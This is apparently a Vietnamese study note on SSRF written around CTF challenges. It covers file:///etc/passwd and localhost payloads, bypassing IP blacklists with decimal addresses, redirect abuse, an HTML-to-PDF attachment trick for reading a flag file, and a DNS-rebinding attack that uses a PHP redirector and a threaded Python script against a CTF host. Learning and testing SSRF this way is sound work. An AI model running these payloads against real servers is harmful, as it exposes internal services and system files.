## Server-side Request Forgery (SSRF)
- giả mạo yêu cầu phía máy chủ là một lỗ hổng bảo mật mà nó cho phép kẻ tấn công sửa đổi tham số trong yêu cầu gửi đi để khiến máy chủ thực hiện truy xuất đến một miền tùy ý mà đó có thể là các dịch vụ chỉ nằm trong nội bộ như là database. (Hiểu đơn giản là attack sử dụng sdt của gia đình để kêu bạn chuyển tiền, bạn không nghi ngờ gì cả mà trực tiếp gửi lun).
#### VD1:
- mình có đường dẫn `/upload?file_url=` dùng để nhập url ảnh để tải lên server. Thì thông thường mình sẽ nhập url mình muốn vào, nhưng nếu server nó không thực hiện việc valid data mà xử lí lun thì mình có thể sử dụng các giao thức `tcp, ftp, telnet, file, ...` dể truy cập url của server để lấy data của chính nó: `/upload?file_url=localhost:1337/data` hoặc `/upload?file_url=file:///etc/passwd`. Thông thường thì /upload sẽ là public để xem ảnh chẵn hạn thì ta có thể truy cập vào đó để lấy data ra. Sau khi biết có lỗ hỏng chúng ta sẽ có thể sử dụng brute force để dò các đường dẫn khác.
#### VD2:
- vẫn tiếp tục với localhost nhưng ở vd2 thì `localost` và `127.0.0.1` bị đưa vào backlist để tránh user có thể gửi để thực thi SSRF, nhưng ở đây ta sẽ không dùng http://localhost hay http://127.0.0.1 nữa mà ta sẽ thay bằng mã decimal của ip: `127.0.0.1 -> 2130706433` hoặc `127.1` thì ngay lúc này ta có thể đã pypass được nếu server không check mã này. (hoặc nếu bị chặn thì mình sẽ sử dụng 1 domain của mình và trỏ dns về 127.0.0.1 để thử)
#### VD3:
- tiếp tục nếu sử dụng vd2 thì server không thực hiện chặn, nhưng nếu server đã đi trước chúng ta 1 bước là phân giải tên miền rồi valid url rồi thì làm sao đây. Thông thường những trang web sẽ có những url trả về status 3xx thì nó sẽ chuyển hướng url về domain chính `redirect.url.com` thì nếu server có cấu hình redirect thì sẽ trỏ về url của trang. Ta có thể tận dụng nó để thử, thông thường là `redirect.url, ...`
#### VD4: HTML to PDF 
- ở trang web có chức năng là html to pdf thì ta có thể sử dụng file html chứa 1 đoạn mã chèn để lấy thông tin của máy chủ sau đó tải về máy và sử dụng tool để lấy data ra:
- Cách tiến hành: đầu tiên mình sẽ tạo 1 file index.html chứ đoạn code `<link rel=attachment href="file:///flag.txt">` sao đó mình mở port `python3 http.server 8888` và đưa lên mạng bằng `ngrok http 8888`, lúc này mình sẽ lấy url của ngrok đưa vào form của web html to pdf và ấn submit, thì khi đó mình sẽ nhận được 1 file pdf rỗng. Tiếp tục mình sẽ sử dụng tool pdfdetach của linux (là một tiện ích dòng lệnh được sử dụng để liệt kê hoặc trích xuất các tệp đính kèm (embedded files) từ các tệp PDF). Mình mở cmd và sử dụng lệnh:
- <img width="1085" height="148" alt="image" src="https://github.com/user-attachments/assets/5e15374a-eab1-46ef-9dcf-eb9612530f8e" />
chúng ta thấy có file flag.txt. Tiếp tục chúng ta sẽ thực hiện lệnh 2:
- <img width="1055" height="101" alt="image" src="https://github.com/user-attachments/assets/7b8339eb-a0fb-4a62-bd3c-9e4bc50aa2d0" />
thì sao khi thực hiện lệnh 2 ta sẽ nhận về được 1 file flag.txt 
#### VD5: Kỹ thuật DNS Rebinding ( Kỹ thuật SSRF nâng cao)
- Ta sẽ nhìn vào đoạn code sao đây
```python
from urllib.parse import urlparse
import requests
import socket

url = "http://localhost:1337/flag"

def validate_url(url):
    valid_url = urlparse(url)
    if valid_url.hostname:
        try:
            ip_address = socket.gethostbyname(valid_url.hostname)
            if ip_address in ['127.0.0.1', '0.0.0.0'] or ip_address.startswith('192.168.'):
                print("Bad URL")
                return False
            else:
                return True
        except socket.gaierror:
            print("Invalid hostname:", valid_url.hostname)
            return False
    else:
        print("Invalid URL format")
        return False
if validate_url(url):
    response = requests.get(url)
```
- Cùng phân tích đoạn code trên, đầu tiên url sẽ được truyền vào biến `valid_url` để xem đúng format chưa, tiếp đến xuống biến `ip_address` nó sẽ phân giải tên miền thành địa chỉ ip để check xem có phải localhost hay không rồi return về True or False, tiếp đến nhìn xuống dòng gần cuối câu lệnh if sẽ gọi hàm `validate_url` nếu đúng thì sẽ gọi request đến url đó, nhìn vào đây mình phát hiện là nó sẽ thực hiện gọi tên miền 2 lần, lần 1 để check và lần 2 để gọi request. Từ đó mình có thể tấn công bằng `DNS Rebinding`(kỹ thuật này nói ngắn gọn là sẽ thay đổi địa chỉ DNS trong 1 time nào đó). Chúng ta sẽ tận đụng cơ chế TTL(Time To Live) nói đơn giản là khi DNS đầu tiên được gửi đến nó kèm theo TTL để lưu vào bộ nhớ cache giúp những lần truy cập sau nhanh hơn và khi nào TTL hết hạn thì sẽ bị delete và thực hiện update lại DNS. Để tấn công chúng ta sẽ phải cài đặt TTL trên domain của ta càng ngắn càng tốt để khi vừa vượt qua hàm if là phải xóa lun để update lại ip mới, đó là các hoạt động của kỹ thuật này.
- Cách tấn công:
Tạo 1 file index.php
```php
<?php 
$temp = rand(0, 1);
if($temp == 1){
    header("Location: http://localhost:1337/flag");
}
?>
```
- Ở đây mình dùng hàm rand để random 2 số 0 và 1, nếu như 0 thì sẽ return về url bình thường có nếu là 1 thì sẽ redirect đến `http://localhost:1337/flag` (Ở đây dựa vào độ may mắn nhé ae =}} )
- Cách run
```
php -S 0.0.0.0:1234 
ngrok http localhost:1234
```
  + Tiếp đến tạo 1 file pyload.py
```python
import requests
from threading import Thread

chall_url = 'http://difference-check.chal.idek.team'
my_url = "http://fe27-14-243-53-28.ngrok.io"

def payload():
    data = {"url1": my_url, "url2": "http://google.com"}
    r = requests.post(chall_url+'/diff', data=data)
    print(r.text)

if __name__ == '__main__':
    for i in range(1,5):
        thread = Thread(target=payload)
        thread.start()
```
- file python này sẽ thực hiện gọi request đến server, vòng for sẽ có tác dụng gọi 5 multitasks request cùng 1 lúc đến server đễ có thể tấn công.
- Cách run
```
python3 payload.py | grep 'flag{'
```
Và dựa vào độ máy mắn của ae để chúng ta xem có flag ở lần gọi file đầu tiên không =))

